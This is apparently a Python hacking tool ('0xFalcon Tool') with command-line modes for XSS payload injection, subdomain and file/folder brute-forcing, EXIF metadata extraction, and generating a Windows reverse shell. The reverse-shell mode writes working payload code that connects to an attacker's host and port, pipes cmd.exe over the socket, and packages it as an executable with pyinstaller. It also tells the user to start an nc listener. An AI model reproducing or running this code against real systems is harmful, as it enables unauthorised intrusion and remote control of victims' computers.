import os
import requests
from optparse import OptionParser
import sys
import socket
from PIL import Image
from PIL.ExifTags import TAGS
import time
#pip install pyinstaller
#_________________________________________________________
use=OptionParser('\033[01;31m0xFalcon Tool\033[00;37m')
use.add_option("-T","--target",dest="target",help="Write The Traget")

#_________________________ File List Option ________________
use.add_option("-L","--List",dest="List",help="File List")
#_________________________ END ___________________________


#_________________________ XSS Tool __________________
use.add_option("-n","--name",dest="name",help="input name (in XSS Tool)")
use.add_option("-m","--method",dest="method",help="method request GET or POST (in XSS Tool)")

#__________________________END________________________________

#____________Metadeta_____
use.add_option("-i","--image",dest="image",help="Image name (Metadeta)")
#_________________END_____________


use.add_option("-u","--Use",dest="Use",help="to use XSS Tool: xss, BruteForce Subdomains: subdomain, BruteForce Files and Folder: F , Metadeta: mt")

#______________________________END______________________

#_______________ Reverse SHELL Windows ______________
use.add_option("-I","--IP",dest="host",help="HOST (Reverse shell)")
use.add_option("-P","--PORT",dest="port",help="port (Reverse shell)")
use.add_option("-F","--file",dest="File_name",help="File Out (Reverse shell)")
use.add_option("-y","--Payload",dest="shell_out",help="Payload (Reverse shell)")
#_________________________END________________________
(options,args) = use.parse_args()
url=options.target
intro='''
                                        /T /I
                                        / |/ | .-~/
                                    T\ Y  I  |/  /  _
                    /T               | \I  |  I  Y.-~/
                    I l   /I       T\ |  |  l  |  T  /
            __  | \l   \l  \I l __l  l   \   `  _. |
            \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |
            \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
            .--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
            ^--.  ~-.   ._  ~^-"    "\\   7   7   ]
            ^.___~"--._    ~-{  .-~ .  `\ Y . /    |
            ^__ ~"-.  ~       /_/   \   \I  Y   : |
            ^-.__           ~(_/   \   ^._:   | l______
                ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
                        (_/ .  ~(   /'     "~"--,Y   -=b-. _)
                        (_/ .  \  :           / l      c"~o  \\
                            \ /    `.    .     .^   \_.-~"~--.)
                            (_/ .   `  /     /       !       )/
                            / / _.   '.   .':      /        '
                            ~(_/ .   /    _  `  .-^_
                                /_/ . ' .-~" `.  / \  \          ,z=.
                                ~( /   '  :   | K   "-.~-.______//
                                "-,.    l   I/ \_    __{---^._(==.
                                //(     \  ^    ~"~"     //
                                /' /\     \  \     ,v=.  ((
                                .^. / /\     "  }__ //===-  `
                            / / ' '  "-.,__ {---(==-
                            .^ '       :  T  ~"   ll       -0xFalcon - xAL7x
                            / .  .  . : | :!        \\
                        (_/  /   | | j-"          ~^
                            ~-^_(_.^-~"'''
b=''''''

#__________________________XSS Exploit_________________
if options.Use=='xss':
    print(intro)
    print("Starting attack::: "+socket.gethostbyname(url))
    if options.List==None: #if opt is null
        pay={
            options.name:(None,'<script>alert(1)</script>'),
        }
        if options.method=="GET": #IF method==GET
            send=requests.get(url,pay).text
            if '<script>alert(1)</script>' in send:
                print('\033[00;37mPayload ->\033[00;32m','<script>alert(1)</script>')
            else:
                print('Please choose your file list')

        elif options.method=="POST":#IF method==POST
            send=requests.post(url,pay).text
            if '<script>alert(1)</script>' in send:
                print('\033[00;37mPayload ->\033[00;32m','<script>alert(1)</script>')
            else:
                print('Please choose your file list')
    else:
        file=open(options.List,'r')
        for payload in file:
            pay={
                options.name:(None,payload),
            }
            if options.method=="GET":
                send=requests.get(url,pay).text
                if payload in send:
                    print('\033[00;37mPayload ->\033[00;32m',payload)
                    break
                '''else:
                    print('\033[00;37mPayload ->\033[00;31m',payload)'''
            elif options.method=="POST":
                send=requests.post(url,pay).text
                if payload in send:
                    print('\033[00;37mPayload ->\033[00;32m',payload)
                    break
                '''else:
                    print('\033[00;37mPayload ->\033[00;31m',payload)'''
#____________________END____________________

#___________________SUbDomain Exploit ________________
elif options.Use=="subdomain":
    print(intro)
    print("Starting attack::: "+socket.gethostbyname(url))
    file=open("Subdomain.txt",'r')
    for subdomain in file:
        Check=f"https://{subdomain}.{url}"
        check2=Check.replace('\n','')
        try:
            send=requests.get(check2).url
            print("\033[01;32m"+send)
        except:
            pass

#_______________________END______________________

#___________________ Brute Force File and Folder ___________
elif options.Use=="F":
    print(intro)
    print("Starting attack::: "+socket.gethostbyname(url))
    file=open("File_Folder_list.txt",'r')
    for f in file:
        file_url=f"https://{url}/{f}"
        file_replace=file_url.replace('\n','')
        try:
            send=requests.get(file_replace)
            if send.reason=="OK":
                print("\033[01;32m"+send.url)
            else:
                pass
        except:
            pass
#___________________ END _________________________________

#___________________ Brute Force File and Folder ___________
elif options.Use=="admin":
    print(intro)
    print("Starting attack::: "+socket.gethostbyname(url))
    file=open(options.List,'r')
    for f in file:
        file_url=f"https://{url}/{f}"
        file_replace=file_url.replace('\n','')
        try:
            send=requests.get(file_replace)
            if send.reason=="OK":
                print("\033[01;32m"+send.url)
            else:
                pass
        except:
            pass
#___________________ END _________________________________

#________ Metadata ______________________________
elif options.Use=="mt":
    print(intro)
    print('Starting Metadata Tool .....')
    time.sleep(2)
    img=options.image
    image=Image.open(img)

    exifdata=image.getexif()
    for tag_id in exifdata:
        tag=TAGS.get(tag_id,tag_id)
        data=exifdata.get(tag_id)
        if isinstance(data,bytes):
            data=data.decode()
        print(f"{tag:40}:{data}")
#_____________ END ____________________

#_____________ REVERSE SHELL ___________________
elif options.Use=="shell":
    print(intro)
    #___ Windows _____
    if options.shell_out=="exe":
        pyFile=options.File_name+'.py'
        file=open(pyFile,'a')
        file.write(f'''
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{options.host}",{options.port}))
a="""
                                                _--_
                                            _
                                            ==(W[==========-      /===-
                                            ||  (.--.)         /===-_---~~~~~~~~~------____
                                            | \_,|**|,__      |===-~___                _,-'`
                                -==\\        `\ ' `--'   ),    `//~\\   ~~~~`---.___.-~~
                            ______-==|        /`\_. .__/\ \    | |  \\           _-~`
                    __--~~~  ,-/-==\\      (   | .  |~~~~|   | |   `\        ,'
                    _-~       /'    |  \\     )__/==0==-\<>/   / /      \      /
                .'        /       |   \\      /~\___/~~\/  /' /        \   /'
                /  ____  /         |    \`\.__/-~~   \  |_/'  /          \/'
                /-'~    ~~~~~---__  |     ~-/~         ( )   /'        _--~`
                                \_|      /        _) | ;  ),   __--~~
                                    '~~--_/      _-~/- |/ \   '-~ \\
                                [\__--_/]    / \\_>-|)<__\      \\
                                /'   (_/  _-~  | |__>--<__|      |
                                |   _/) )-~     | |__>--<__|      |
                                / /~ ,_/       / /__>---<__/      |
                                o-o _//        /-~_>---<__-~      /
                                (^(~          /~_>---<__-      _-~
                                ,/|           /__>--<__/     _-~
                            ,//('(          |__>--<__|     /                  .----_
                            ( ( '))          |__>--<__|    |                 /' _---_~\\
                        `-)) )) (           |__>--<__|    | -0xFalcon      /'  /     ~\`\\
                        ,/,'//( (             \__>--<__\    \            /'  //        ||
                    ,( ( ((, ))              ~-__>--<_~-_  ~--____---~' _/'/        /'
                    `~/  )` ) ,/|                 ~-_~>--<_/-__       __-~ _/
                ._-~//( )/ )) `                    ~~-'_/_/ /~~~~~~~__--~
                ;'( ')/ ,)(                              ~~~~~~~~~~
                ' ') '( (/
                    '   '  `
Press [Enter];"""
s.send(a.encode())
dataFromServer = s.recv(1024)
p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()''')
        os.system(f'pyinstaller --onefile {pyFile}')
        print(f'Type in Terminal: nc -vlp {options.port}')
        #___________